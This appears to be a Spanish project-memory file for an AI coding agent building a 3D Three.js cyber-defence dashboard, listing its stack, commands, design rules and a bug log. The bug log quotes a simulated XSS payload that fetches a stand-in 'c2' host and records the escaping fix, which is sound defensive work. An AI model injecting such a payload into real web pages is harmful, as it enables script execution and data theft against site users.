# MEMORIA PERSISTENTE DEL PROYECTO (MEMORY.md)
> **INSTRUCCION PARA EL AGENTE DE IA:** Lee este archivo al inicio de CADA sesion antes de tocar cualquier archivo. Al finalizar cualquier cambio arquitectonico o resolver un bug no trivial, actualiza las secciones correspondientes manteniendo este archivo por debajo de 150 lineas.

## 1. Identidad y Objetivo del Proyecto
- **Nombre del Proyecto:** `AEGIS // ZERO-TRUST SOC 3D`
- **Descripcion en 1 linea:** Centro de Comando Global 3D de Ciberdefensa Zero-Trust, Microsegmentación e Inspección de Amenazas en Tiempo Real (`Three.js` + `GLSL` 100% procedural).
- **URL de Produccion / Puerto Local:** `http://127.0.0.1:8814/index.html` (aislamiento de benchmark puerto `8814`)

## 2. Stack Tecnologico y Comandos Verificados
- **Lenguaje / Runtime:** HTML5 + CSS3 + ES2024 Modules + GLSL Shaders
- **Framework Principal:** Three.js `0.160.0` + `OrbitControls` vía `<script type="importmap">` (100% autocontenido en `index.html`, cero imágenes/mapas externos, cero emojis Unicode)
- **Comando para levantar entorno local:** `python3 -m http.server 8814 --bind 127.0.0.1`
- **Comando de pruebas / verificacion:** Headless Chromium WebGL + `?selftest=1` (`AEGIS_SELFTEST_OK`, `0` errores en consola)

## 3. Reglas Inquebrantables de Arquitectura y Diseño
1. **Cero Codigo Incompleto:** Prohibido dejar comentarios como `// TODO`, `// implementar despues` o funciones vacias.
2. **Verificacion Real Antes de Entregar:** Ninguna tarea se reporta como terminada hasta que el codigo compile sin errores y, si tiene interfaz visual, se haya verificado con cero errores en consola del navegador.
3. **Rendimiento y Limpieza:** Evitar algoritmos $O(N^2)$ en bucles de renderizado; buffers pre-asignados (`Float32Array`) para 520 pulsos simultáneos en curvas Bézier 3D y `dt` clamping (`Math.min(rawDt, 0.033)`).

## 4. Mapa de Archivos Clave
- `index.html` — Aplicación completa 3D SOC Zero-Trust (Globo Holográfico GLSL + Topología de Clúster 3D + Motor de Mitigación e Inspector de Paquetes)
- `GEMINI.md` — Protocolo Maestro Mixiuh Labs Superpowers
- `MEMORY.md` — Memoria persistente entre sesiones

## 5. Bitacora de Decisiones Tecnicas (ADR Corto)
- **[2026-10-22]:** Se implementó `index.html` con un shader planetario GLSL procedural (FBM + máscaras continentales gaussianas + retícula geodésica + atmósfera Fresnel + onda global de rotación de llaves mTLS), 20 nodos estratégicos globales con interpolación suave entre Vista Globo 3D y Vista Grafo de Microsegmentación 3D, Raycasting interactivo (Quarantine / Anycast Scrubbing) y telemetría 60Hz.

## 6. Errores Conocidos y Soluciones Aprendidas (No Repetir)
- `[index.html / pushPacketAuditEntry]`: El payload simulado de XSS (`<svg/onload=fetch('//c2.io')>`) insertado sin escapar en `innerHTML` provocaba ejecución DOM real y `TypeError: Failed to fetch` en consola -> Se implementó `escapeHtml()` para sanitizar todos los payloads L7 antes de renderizar en el registro de auditoría.
